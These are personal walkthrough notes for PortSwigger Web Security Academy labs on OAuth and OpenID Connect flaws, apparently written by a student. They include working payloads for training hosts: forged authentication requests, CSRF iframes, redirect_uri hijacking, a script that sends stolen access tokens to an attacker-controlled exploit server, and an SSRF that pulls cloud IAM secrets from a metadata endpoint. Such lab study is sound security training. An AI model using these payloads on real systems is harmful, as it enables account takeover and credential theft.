<span style="color:yellow;font-weight:700;font-size:30px">
OAuth 2.0 authentication vulnerabilities
</span>
https://portswigger.net/web-security/oauth

# OAuth grant types
https://portswigger.net/web-security/oauth/grant-types


# ***1. Lab: Authentication bypass via OAuth implicit flow***
https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow

To solve the lab, log in to Carlos's account. His email address is carlos@carlos-montoya.net 

explore and understand the OAuth flow:

1.authorzation request:
    GET /auth?client_id=xdy4frutgs7wybl95yxte&redirect_uri=https://0a8c004104f09336c0fa667700ec003d.web-security-academy.net/oauth-callback&response_type=token&nonce=-182041618&scope=openid%20profile%20email HTTP/1.1
    Host: oauth

2.user login - request access to user data:
    GET /interaction/wiR83Unc681Ot5TLf4AOJ HTTP/1.1
    Host: oauth

 user login - access granted:
    POST /interaction/wiR83Unc681Ot5TLf4AOJ/confirm HTTP/1.1
    Host: oauth

3.OAuth redirects browser back to client with access token in fragment in the response:
    GET /auth/wiR83Unc681Ot5TLf4AOJ HTTP/1.1
    Host: oauth
response:
    HTTP/1.1 302 Found
    ..
    Redirecting to <a href="https://0a8c004104f09336c0fa667700ec003d.web-security-academy.net/oauth-callback#access_token=1Cy4pkFilqjUbo9i1vkQl2ZTHWfKH_deo97i9aWlgta&amp;expires_in=3600&amp;token_type=Bearer&amp;scope=openid%20profile%20email">

note that this concludes stage 1 - user authentication in OAauth
 
 
4.request to callback API - it has information in the URI that the script in response extract and display in reponse:
    GET /oauth-callback HTTP/1.1
    Host: 0a8c004104f09336c0fa667700ec003d.web-security-academy.net

response:
    HTTP/1.1 200 OK
    ..
    <script>
    const urlSearchParams = new URLSearchParams(window.location.hash.substr(1));
    const token = urlSearchParams.get('access_token');
    fetch('https://oauth-0a43008304bf937bc0d2666b023900fe.web-security-academy.net/me', {
        method: 'GET',
        headers: {
            'Authorization': 'Bearer ' + token,
            'Content-Type': 'application/json'
        }
    })
    .then(r => r.json())
    .then(j => 
        fetch('/authenticate', {
            method: 'POST',
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                email: j.email,
                username: j.sub,
                token: token
            })
        }).then(r => document.location = '/'))
    </script>

The client application then accesses the token using JavaScript. inorder to maintain the session after the user closes the page, it stores the current user data (normally a user ID and the access token) at the server by submitting it in a POST request and then assign the user a session cookie, effectively logging them in:

5.an API call to OAuth server with proper credentials yields the user data needed to login:

    POST /authenticate HTTP/1.1
    Host: 0a8c004104f09336c0fa667700ec003d.web-security-academy.net
    ..
    {"email":"wiener@hotdog.com","username":"wiener","token":"1Cy4pkFilqjUbo9i1vkQl2ZTHWfKH_deo97i9aWlgta"}

note that this combines the access token recived in stage 1 (user login) with stage 2 (client valiadtion) procedures (step1-)

change email and username and leave token:

 {"email":"carlos@carlos-montoya.net","username":"carlos","token":"1Cy4pkFilqjUbo9i1vkQl2ZTHWfKH_deo97i9aWlgta"}

# Carlosed


hint:
 Once you know the hostname of the authorization server, you should always try sending a GET request to the following standard endpoints:

    /.well-known/oauth-authorization-server
    /.well-known/openid-configuration

These will often return a JSON configuration file containing key information, such as details of additional features that may be supported. This will sometimes tip you off about a wider attack surface and supported features that may not be mentioned in the documentation. 



# ***2. Lab: Forced OAuth profile linking***
https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking

To solve the lab, use a CSRF attack to attach your own social media profile to the admin user's account on the blog website, then access the admin panel and delete Carlos. 

login with normal usernam and password
attach a social media account with OAuth
study process:

    GET /auth?client_id=vlmsozpti7yxvj88ty6k1&redirect_uri=https://0a1d00bb03419cc9c019238000270050.web-security-academy.net/oauth-linking&response_type=code&scope=openid%20profile%20email HTTP/1.1
response:
    HTTP/1.1 302 Found
    ..
    Redirecting to <a href="https://0a1d00bb03419cc9c019238000270050.web-security-academy.net/oauth-linking?code=C3ZM1zVhBaCRlmu6MeexiZd1pBK7mXnM0KXzFJRSVHL">

and then
    GET /oauth-linking?code=C3ZM1zVhBaCRlmu6MeexiZd1pBK7mXnM0KXzFJRSVHL HTTP/1.1

note it doesnt have a state parameter = vulnarbale!

turn interception on and begin attaching process again
forward until you get a new code. copy url and drop the req.

close interception and go to exploit server
use iframe to build a CSRF attack against the admin:
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE"></iframe>


final payload:
    <iframe src="https://0a1d00bb03419cc9c019238000270050.web-security-academy.net/oauth-linking?code=NVzgflLZKPaQcxPX4lYVAaxtXoo2JHkpG980pwSykzF"></iframe>

send to admin (dont load exploit to avoid wasting the linkage code)

log out (note no social media account is linked) and wait for admin to press exploit
log in using you social media and observe you are in admin account
delet carlos

# Carlosed


# ***3. Lab: OAuth account hijacking via redirect_uri***
https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri

To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete Carlos. 

    GET /auth?client_id=[...]


    GET /auth?client_id=e93r2r12dcywur7blqun3&redirect_uri=https://exploit-0a2700640470274ec0a30d64011d0032.web-security-academy.net/exploit&response_type=code&scope=openid%20profile%20email HTTP/1.1

    GET  HTTP/1.1

    <iframe src="https://oauth-0a92004d04ee271cc0810d9c025e0097.web-security-academy.net/auth?client_id=e93r2r12dcywur7blqun3&redirect_uri=https://exploit-0a2700640470274ec0a30d64011d0032.web-security-academy.net/exploit&response_type=code&scope=openid%20profile%20email"></iframe>


    https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN-CODE



# ***4. Lab: Stealing OAuth access tokens via an open redirect***
https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect

To solve the lab, identify an open redirect on the blog website and use this to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner. 

study site. observe open redirect on blog pages "next page" links:
GET /post/next?path=/post?postId=9 HTTP/1.1

part 1 - extracton method 

find:
travesal location
API location
steal token via accesss log (with script to make it visible)

three links in the script are:

**1st**
authentication initialization while assigning the address for the response:
https://oauth-ac091f821fd0471ac088e8a2022f0013.web-security-academy.net/auth?client_id=a388sx5v6gxa1pdywvj38&redirect_uri=

**2nd**
redirecting from whitelisted domain to attacker controlled URL using blog's next path feature + path traversl method:
https://acdd1f361f3c4746c0d4e8ba002d00b2.web-security-academy.net/oauth-callback/../post/next?path=

**3rd**
link to the exploit location:
https://exploit-ac991fef1f8f4782c0c3e884011800de.web-security-academy.net/exploit
dna the rest of the 1st adress:
&response_type=token&nonce=373179658&scope=openid%20profile%20email

**format:**

{1st link.. redirect uri={2n link?path={2rd link}} 1st link ending}

this leaks the token via fragment in the URI
when victims returns back to the malicious link (window.location.hash = True)
the script extracts the hash from the URI and sends it as a GET parameter to finalize the leak


1.
https://oauth-0adb00460487a6c3c0392e5f02110022.web-security-academy.net/auth?client_id=do56u1zrsd8zhv08oimzq&redirect_uri=https://0a1a000f047ca6e6c0762eaf00c6002e.web-security-academy.net/oauth-callback&response_type=token&nonce=884658517&scope=openid%20profile%20email

2.
    whitelisted url + 
    https://0a1a000f047ca6e6c0762eaf00c6002e.web-security-academy.net/oauth-callback
    travesal to open redirect/../post/next?path=

3.
    https://exploit-0a83009b04d7a673c0362e2401f00036.web-security-academy.net/exploit

    avengers assamble!:
    https://oauth-0adb00460487a6c3c0392e5f02110022.web-security-academy.net/auth?client_id=do56u1zrsd8zhv08oimzq&redirect_uri=
    https://0a1a000f047ca6e6c0762eaf00c6002e.web-security-academy.net/oauth-callback
    /../post/next?path=
    https://exploit-0a83009b04d7a673c0362e2401f00036.web-security-academy.net/exploit
    &response_type=token&nonce=884658517&scope=openid%20profile%20email

final payload:
    https://oauth-0adb00460487a6c3c0392e5f02110022.web-security-academy.net/auth?client_id=do56u1zrsd8zhv08oimzq&redirect_uri=https://0a1a000f047ca6e6c0762eaf00c6002e.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a83009b04d7a673c0362e2401f00036.web-security-academy.net/exploit&response_type=token&nonce=884658517&scope=openid%20profile%20email


script to load the window as a page:

    <script>
    if (!document.location.hash) {
    window.location = 'payload'
    } else {
    window.location = '/?'+document.location.hash.substr(1)
    }
    </script>

the script checks for hash presence and puts all fragments (minus the 0 index char = #) after a /? to make it a logged param so our server can see it in the access log

explanation about the script:
https://youtu.be/grkMW56WX2E?t=447



    <script>
    if (!document.location.hash) {
    window.location = 'https://oauth-0adb00460487a6c3c0392e5f02110022.web-security-academy.net/auth?client_id=do56u1zrsd8zhv08oimzq&redirect_uri=https://0a1a000f047ca6e6c0762eaf00c6002e.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a83009b04d7a673c0362e2401f00036.web-security-academy.net/exploit&response_type=token&nonce=884658517&scope=openid%20profile%20email'
    } else {
    window.location = '/?'+document.location.hash.substr(1)
    }
    </script>


check exploit server log - find leaked infornation:

    10.0.4.166      2022-07-29 17:38:12 +0000 "GET /?access_token=ZHvzcAGdTG-rdfXAsZXbBpiuNAQq0L_F5C70CgGBwbB&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"


search for bearer in request or apikey in respnses observe /me request with access token in Authorization header - change token to leaked admin token:
    GET /me HTTP/1.1
    ..
    Authorization: Bearer ZHvzcAGdTG-rdfXAsZXbBpiuNAQq0L_F5C70CgGBwbB

response:
    HTTP/1.1 200 OK
    ..

    {"sub":"administrator","apikey":"TE1YFcPrsg9X1behDDqIeYAYn79O2cgQ","name":"Administrator","email":"administrator@normal-user.net","email_verified":true}

# solved

iframe didnt work. since linked informatio came as a frag (#) and not param (?)
    <iframe src='https://oauth-0adb00460487a6c3c0392e5f02110022.web-security-academy.net/auth?client_id=do56u1zrsd8zhv08oimzq&redirect_uri=https://0a1a000f047ca6e6c0762eaf00c6002e.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a83009b04d7a673c0362e2401f00036.web-security-academy.net/exploit&response_type=token&nonce=884658517&scope=openid%20profile%20email'>


<span style="color:yellow;font-weight:700;font-size:30px">
OpenID Connect
</span>
https://portswigger.net/web-security/oauth/openid

# ***1. Lab: SSRF via OpenID dynamic client registration***
https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration

 This lab allows client applications to dynamically register themselves with the OAuth service via a dedicated registration endpoint. Some client-specific data is used in an unsafe way by the OAuth service, which exposes a potential vector for SSRF.

To solve the lab, craft an SSRF attack to access http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/ and steal the secret access key for the OAuth provider's cloud environment. 

in **GET /social-login HTTP/1.1** we find a redirect:
    <meta http-equiv=refresh content='3;url=https://oauth-0a1e007604dd0a8cc19e06500278004f.web-security-academy.net/auth?client_id=ti8y5birgps5gfy8iqkcj&redirect_uri=https://0ab8005e04c10a06c1fa063d00e500de.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email'>

1. investigate openid configuration:
request 
    GET /.well-known/openid-configuration HTTP/1.1
    Host: oauth-0ade002103334477c08e5c78022700d7.web-security-academy.net

response:
    HTTP/1.1 200 OK

    {
    ..
    ..
    "registration_endpoint":"https://oauth-0ade002103334477c08e5c78022700d7.web-security-academy.net/reg",
    ..
    ..
    }

2.  once registration is found we can register our own application. we start with just a placeholder, to check if we can register our app::
request:
    POST /reg HTTP/1.1
    Host: oauth-0ade002103334477c08e5c78022700d7.web-security-academy.net

    {
        "redirect_uris" : [
            "https://example.com"
        ]
    }

response:
    HTTP/1.1 201 Created

    {
    ..
    "client_id":"t2sVtQyk5Pf1B0Rm3cWKp",
    ..
    ,"redirect_uris":["https://example.com"
    }



3.  the openID lets a user choose its own logo - as defined by logo_uri claim. add claim with Burp Collaborator address to check if it redirects:
    POST /reg HTTP/1.1
    Host: oauth-0ade002103334477c08e5c78022700d7.web-security-academy.net

    {
        "redirect_uris" : [
            "https://example.com"
        ],
    "logo_uri" : "https://nofedguoj1rc4c5n6krwdtibn2tshh.oastify.com"
    }

check collaborator to see we have am http request - we now know the redirect is working


4.  change the redirect uri to poiont to the target adddress:
    POST /reg HTTP/1.1
    Host: oauth-0ade002103334477c08e5c78022700d7.web-security-academy.net

    {
        "redirect_uris" : [
            "https://example.com"
        ],
    "logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"

5. copy the clientID and paste it at the logo rewuest as follow:
request:
    GET /client/xsibNCUsoQJAMTrDH_d7P/logo HTTP/1.1

response:
    HTTP/1.1 200 OK

    {
    "Code" : "Success",
    "LastUpdated" : "2022-10-26T20:45:05.318168283Z",
    "Type" : "AWS-HMAC",
    "AccessKeyId" : "KbxzJNXvDg32mEfgItrP",
    "SecretAccessKey" : "JVI8mV41VplyWD7FQHa1XumcdlqBUa7yNCEa2TDC",
    "Token" : "TA5mMAJTBAOMy32FcgFxfJxsWbL6q6CaOztu8XPtzdrtC3VksESkgciJeejpphtJY23AnsR9lVxLfHHhapHQvjAWYbkS8G6mQwB2VJBa8EJ5AFXtSM5DIonEjy6Epj2gdnVcrITe0RAFDfSEdQfyszS2PEUDxyjOamkavH0PQPqK0sLSOgG0T4pN9n4Llhu8L7trKMKejGh9Yd0PfbJHaS8oyR7ZqKpqLvdnZSg5i55evnkJvcGLNnQdAEXp3bjU",
    "Expiration" : "2028-10-24T20:45:05.318168283Z"

6. submit **SecretAccessKey** value as solution

# Lab solved!




